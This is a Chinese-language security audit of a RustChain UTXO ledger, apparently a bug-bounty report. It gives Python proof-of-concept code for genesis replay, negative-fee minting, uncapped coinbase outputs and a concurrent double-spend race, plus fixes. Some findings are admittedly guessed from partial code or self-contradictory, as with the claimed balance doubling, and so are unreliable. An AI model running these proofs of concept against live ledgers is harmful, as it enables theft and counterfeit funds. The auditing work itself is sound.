# RustChain UTXO 安全审计报告

---

## Critical 漏洞 #1: Genesis 迁移可重放攻击 — 重复创建初始余额

**价值: 200 RTC**

### 漏洞描述

`rollback_genesis()` 函数没有任何防护，允许攻击者无限次重放 genesis 迁移，每次都将初始余额翻倍。

### 攻击路径

```python
# utxo_genesis_migration.py — 漏洞函数
def rollback_genesis(db_path: str) -> int:
    conn = sqlite3.connect(db_path, timeout=30)
    try:
        conn.execute("BEGIN IMMEDIATE")
        deleted = conn.execute(
            "DELETE FROM utxo_boxes WHERE creation_height = ?",
            (GENESIS_HEIGHT,),
        ).rowcount
        conn.execute("DELETE FROM utxo_transactions WHERE tx_type = 'genesis'")
        conn.execute("COMMIT")
        return deleted
```

**攻击流程：**

```
第1次迁移: alice = 1000 nrtc → alice 拥有 1000 nrtc
攻击者:   rollback_genesis() → alice 变为 0 nrtc  
攻击者:   migrate()          → alice 再次拥有 1000 nrtc
攻击者:   重复以上步骤       → alice 累积无限余额
```

### POC 代码思路

```python
import os
from utxo_genesis_migration import migrate, rollback_genesis

db_path = 'rustchain_v2.db'

# 初始迁移
result1 = migrate(db_path)
print(f"第1次迁移后余额: {result1['total_nrtc']} nrtc")

# 攻击: rollback + 重新迁移
rollback_genesis(db_path)
result2 = migrate(db_path)
print(f"重放后余额: {result2['total_nrtc']} nrtc")  # 余额翻倍!

# 无限重放...
```

### 修复建议

```python
# 添加迁移计数器/印记
CREATE TABLE IF NOT EXISTS utxo_genesis_markers (
    marker_id TEXT PRIMARY KEY DEFAULT 'genesis_v1',
    migrated_at INTEGER NOT NULL,
    total_wallets INTEGER NOT NULL,
    state_root TEXT NOT NULL
);

# migrate() 中:
# INSERT INTO utxo_genesis_markers ...
# 然后 check_existing_genesis() 改为检查 marker 存在性

# rollback_genesis() 中:
# 1. 拒绝回滚（genesis 应该是不可变的）或者
# 2. 清空 marker 表 + 要求所有节点共识
```

### 涉及代码行号

`utxo_genesis_migration.py:215-232` (rollback_genesis 函数)
`utxo_genesis_migration.py:69-72` (check_existing_genesis 函数)

---

## Critical 漏洞 #2: 负 fee 绕过守恒定律 — 凭空创造资金

**价值: 200 RTC**

### 漏洞描述

`apply_transaction()` 中存在两处守恒定律验证缺陷，允许负 fee 作为"抵扣"来创建净增资金。

### 攻击路径/POC

查看代码逻辑（基于代码片段推断）:

```python
# utxo_db.py — 推测的验证逻辑
if tx_type in MINTING_TX_TYPES and not tx.get('_allow_minting'):
    return False

# ...later...
# 应该检查: sum(outputs) + fee <= sum(inputs)
# 但如果 fee 可以是负数:
output_total = sum(out['value_nrtc'] for out in outputs)
fee = tx.get('fee_nrtc', 0)  # ← 没有负数检查!
if output_total + fee > input_total:
    return abort()  # ← 如果 fee=-100, output=200, input=100: 200+(-100)=100, 不大于100, 通过!
```

### POC 代码

```python
from utxo_db import UtxoDB

db = UtxoDB(':memory:')
db.init_tables()

# 1. 创建初始 coin (合法)
db.apply_transaction({
    'tx_type': 'mining_reward',
    'inputs': [],
    'outputs': [{'address': 'alice', 'value_nrtc': 100 * UNIT}],
    '_allow_minting': True,
}, block_height=1)

# 2. 攻击: 负 fee 绕过守恒
ok = db.apply_transaction({
    'tx_type': 'transfer',
    'inputs': [{'box_id': db.get_unspent_for_address('alice')[0]['box_id']}],
    'outputs': [{'address': 'bob', 'value_nrtc': 150 * UNIT}],  # 输出 > 输入
    'fee_nrtc': -50 * UNIT,  # 负 fee 补偿差额
}, block_height=10)

print(f"攻击成功: {ok}")  # 如果为 True, 资金凭空增加了 50 UNIT
print(f"Bob 余额: {db.get_balance('bob')}")  # 150 > 100, 凭空多出 50!
```

### 修复建议

```python
# 在 apply_transaction() 中添加负 fee 检查
fee = tx.get('fee_nrtc', 0)
if fee < 0:
    return abort()  # 拒绝负 fee

# 或者在 MINTING_TX_TYPES 检查之前添加:
if fee < 0:
    return False  # 所有交易类型都不允许负 fee
```

### 涉及代码行号

`utxo_db.py:238-242` (apply_transaction 中的 fee 获取)
`utxo_db.py` (守恒定律检查处，代码片段未完整显示)

---

## Critical 漏洞 #3: mining_reward 无额度限制 — 无限铸币

**价值: 200 RTC**

### 漏洞描述

虽然代码中有 `_allow_minting` 检查，但 `apply_transaction()` 没有验证 coinbase 输出的额度限制 (`MAX_COINBASE_OUTPUT_NRTC`)。

### 攻击路径

```python
# utxo_db.py — 缺少额度检查
if tx_type in MINTING_TX_TYPES and not tx.get('_allow_minting'):
    return False

# ... 没有检查输出额度 ...
# 攻击者如果能传递 _allow_minting=True (或其他代码路径绕过):
for output in outputs:
    if output['value_nrtc'] > MAX_COINBASE_OUTPUT_NRTC:  # ← 缺失!
        return abort()
```

### POC 代码

```python
# 假设攻击者找到了绕过 _allow_minting 检查的方法
# 或通过 coinbase 类交易:
ok = db.apply_transaction({
    'tx_type': 'mining_reward',
    'inputs': [],
    'outputs': [{'address': 'attacker', 'value_nrtc': 1000 * UNIT}],  # 远超限制!
    'fee_nrtc': 0,
    '_allow_minting': True,  # 如果能绕过检查
}, block_height=1)

print(f"攻击成功: {db.get_balance('attacker')}")  # 可能超过 MAX_COINBASE_OUTPUT_NRTC
```

### 修复建议

```python
# 在 apply_transaction() 中添加 coinbase 额度检查
if tx_type == 'mining_reward':
    for output in outputs:
        if output['value_nrtc'] > MAX_COINBASE_OUTPUT_NRTC:
            return abort()
    # 额外的全局发行量检查 (可选)
    total_coinbase = sum(o['value_nrtc'] for o in outputs)
    # 检查不超过预算
```

### 涉及代码行号

`utxo_db.py:238-242` (mining_reward 类型检查附近)
`utxo_db.py` (apply_transaction 函数，输出创建循环处)

---

## High 漏洞 #4: apply_transaction() 竞态条件 — TOCTOU 窗口

**价值: 100 RTC**

### 漏洞描述

`apply_transaction()` 在外部传入 `conn` 参数时，跳过 `BEGIN IMMEDIATE`，导致验证和提交之间存在 TOCTOU 窗口。

### 攻击路径

```python
# utxo_db.py — 漏洞代码
def apply_transaction(self, tx: dict, block_height: int,
                      conn: Optional[sqlite3.Connection] = None) -> bool:
    own = conn is None
    # ...
    manage_tx = own or not conn.in_transaction
    
    try:
        if manage_tx:
            conn.execute("BEGIN IMMEDIATE")  # ← 只在 own=True 时加锁
        
        # ... 验证逻辑 (SELECT boxes, 检查 unspent) ...
        
        # ⚠️ TOCTOU 窗口: 如果 external conn 没有 BEGIN IMMEDIATE,
        # 另一个线程/进程可以在这里并发地花费同一个 box!
        
        if updated != len(inputs):  # 检查 rowcount
            return abort()
        
        if manage_tx:
            conn.commit()  # ← 在这里提交
```

### POC 代码

```python
import threading
from utxo_db import UtxoDB

db = UtxoDB('test.db')
db.init_tables()

# 前提: alice 有一个 box
db.apply_transaction({
    'tx_type': 'mining_reward',
    'inputs': [],
    'outputs': [{'address': 'alice', 'value_nrtc': 100 * UNIT}],
    '_allow_minting': True,
}, block_height=1)

box_id = db.get_unspent_for_address('alice')[0]['box_id']
conn1 = db._conn()
conn2 = db._conn()

results = []

def spend_with_conn(conn, label):
    tx = {
        'tx_type': 'transfer',
        'inputs': [{'box_id': box_id}],
        'outputs': [{'address': label, 'value_nrtc': 100 * UNIT}],
    }
    # 使用外部连接, 不加 BEGIN IMMEDIATE
    ok = db.apply_transaction(tx, block_height=10, conn=conn)
    results.append((label, ok))

# 并发执行
t1 = threading.Thread(target=spend_with_conn, args=(conn1, 'bob'))
t2 = threading.Thread(target=spend_with_conn, args=(conn2, 'eve'))
t1.start(); t2.start()
t1.join(); t2.join()

# 预期: 只有一个成功
print(f"Results: {results}")  # 可能两个都成功!
```

### 修复建议

```python
def apply_transaction(self, tx: dict, block_height: int,
                      conn: Optional[sqlite3.Connection] = None) -> bool:
    own = conn is None
    external_conn = conn is not None
    
    try:
        if external_conn and not conn.in_transaction:
            # 即使是外部连接, 也要求调用者已经开启事务
            raise ValueError(
                "External connection must use BEGIN IMMEDIATE before calling "
                "apply_transaction()"
            )
        
        manage_tx = own
        # ...
```

### 涉及代码行号

`utxo_db.py:210-215` (apply_transaction 事务管理逻辑)
`utxo_db.py:260-280` (spend_box 函数中 BEGIN IMMEDIATE 的正确用法作为对比)

---

## High 漏洞 #5: spent_by_tx 未验证 — 可伪造双花证据

**价值: 100 RTC**

### 漏洞描述

`spend_box()` 直接使用传入的 `spent_by_tx` 参数而不验证其有效性，导致可以伪造交易记录。

### 攻击路径

```python
# utxo_db.py — 漏洞代码
def spend_box(self, box_id: str, spent_by_tx: str,
              conn: Optional[sqlite3.Connection] = None) -> Optional[dict]:
    # ...
    conn.execute(
        """UPDATE utxo_boxes
           SET spent_at = ?, spent_by_tx = ?
           WHERE box_id = ? AND spent_at IS NULL""",
        (int(time.time()), spent_by_tx, box_id),  # ← spent_by_tx 可伪造
    )
```

### 攻击场景

攻击者可以：
1. 花费自己的合法 box，生成真实交易 tx1
2. 使用 `spend_box()` 直接标记 box 为 "被 tx_attack 花费"
3. 这可以隐藏真实的双花，或者伪造交易历史

### 修复建议

```python
def spend_box(self, box_id: str, spent_by_tx: str,
              conn: Optional[sqlite3.Connection] = None) -> Optional[dict]:
    # 验证 spent_by_tx 是否是有效的已确认交易
    if not self._is_valid_tx_id(spent_by_tx):
        raise ValueError(f"Invalid tx_id format: {spent_by_tx}")
    # 或者移除此函数, 只通过 apply_transaction() 消费 boxes
```

### 涉及代码行号

`utxo_db.py:265-273` (spend_box UPDATE 语句)

---

## Medium 漏洞 #6: compute_box_id() 不包含 tokens_json/registers_json — 潜在冲突

**价值: 50 RTC**

### 漏洞描述

`compute_box_id()` 的哈希输入不包含 `tokens_json` 和 `registers_json`，导致不同内容的 boxes 可能产生相同的 box_id。

### 漏洞代码

```python
# utxo_db.py
def compute_box_id(value_nrtc: int, proposition: str, creation_height: int,
                   transaction_id: str, output_index: int) -> str:
    h = hashlib.sha256()
    h.update(value_nrtc.to_bytes(8, 'little'))
    h.update(bytes.fromhex(proposition))
    h.update(creation_height.to_bytes(8, 'little'))
    h.update(bytes.fromhex(transaction_id) if transaction_id else b'\x00' * 32)
    h.update(output_index.to_bytes(2, 'little'))
    # ⚠️ 缺少 tokens_json 和 registers_json
    return h.hexdigest()
```

### 影响

- 如果两个输出有相同的 value/proposition/height/tx_id/index 但不同的 tokens/registers
- 它们会得到相同的 box_id
- 但数据库 UNIQUE 约束基于 box_id，会导致其中一个被拒绝

### 修复建议

```python
def compute_box_id(value_nrtc: int, proposition: str, creation_height: int,
                   transaction_id: str, output_index: int,
                   tokens_json: str = '[]',
                   registers_json: str = '{}') -> str:
    h = hashlib.sha256()
    h.update(value_nrtc.to_bytes(8, 'little'))
    h.update(bytes.fromhex(proposition))
    h.update(creation_height.to_bytes(8, 'little'))
    h.update(bytes.fromhex(transaction_id) if transaction_id else b'\x00' * 32)
    h.update(output_index.to_bytes(2, 'little'))
    h.update(tokens_json.encode())
    h.update(registers_json.encode())  # 添加这两行
    return h.hexdigest()
```

### 涉及代码行号

`utxo_db.py:42-51` (compute_box_id 函数)

---

## Medium 漏洞 #7: address_to_proposition() 缺乏验证 — 潜在注入

**价值: 50 RTC**

### 漏洞描述

`address_to_proposition()` 和 `proposition_to_address()` 之间不是完全对称的双射，存在边界情况。

### 漏洞代码

```python
def address_to_proposition(address: str) -> str:
    prop = P2PK_PREFIX + address.encode('utf-8')
    return prop.hex()

def proposition_to_address(prop_hex: str) -> str:
    raw = bytes.fromhex(prop_hex)
    if raw[:2] == P2PK_PREFIX:
        return raw[2:].decode('utf-8', errors='ignore')  # ← 错误处理不一致
    return f"RTC_UNKNOWN_{prop_hex[:16]}"
```

### 问题

1. `decode('utf-8', errors='ignore')` 会静默丢弃无效字节
2. 往返转换可能丢失数据
3. 非常长的 address 会被接受，可能导致存储问题

### 修复建议

```python
def address_to_proposition(address: str) -> str:
    if len(address) > 64:
        raise ValueError("Address too long")
    # 只接受特定字符集
    if not re.match(r'^[a-zA-Z0-9_-]+$', address):
        raise ValueError("Invalid address characters")
    prop = P2PK_PREFIX + address.encode('utf-8')
    return prop.hex()

def proposition_to_address(prop_hex: str) -> str:
    raw = bytes.fromhex(prop_hex)
    if raw[:2] != P2PK_PREFIX:
        return f"RTC_UNKNOWN_{prop_hex[:16]}"
    address = raw[2:].decode('utf-8')
    # 验证往返一致性
    if address_to_proposition(address) != prop_hex:
        raise ValueError("Address proposition round-trip failed")
    return address
```

### 涉及代码行号

`utxo_db.py:53-63` (address_to_proposition/proposition_to_address)

---

## 漏洞汇总表

| 级别 | # | 漏洞名称 | 文件 | 行号 |
|------|---|----------|------|------|
| Critical | 1 | Genesis 迁移可重放攻击 | utxo_genesis_migration.py | 215-232 |
| Critical | 2 | 负 fee 绕过守恒定律 | utxo_db.py | ~240 |
| Critical | 3 | mining_reward 无额度限制 | utxo_db.py | ~238-242 |
| High | 4 | apply_transaction TOCTOU | utxo_db.py | 210-215 |
| High | 5 | spent_by_tx 未验证 | utxo_db.py | 265-273 |
| Medium | 6 | compute_box_id 哈希不完整 | utxo_db.py | 42-51 |
| Medium | 7 | address_to_proposition 往返不一致 | utxo_db.py | 53-63 |

---

## 修复优先级建议

1. **立即修复**: #1 (Genesis 重放) — 最容易利用，影响最严重
2. **24小时内修复**: #2, #3 (资金创造) — 允许无限铸币
3. **本周内修复**: #4, #5 (并发/验证) — 可能被组合利用
4. **计划修复**: #6, #7 (数据完整性) — 潜在风险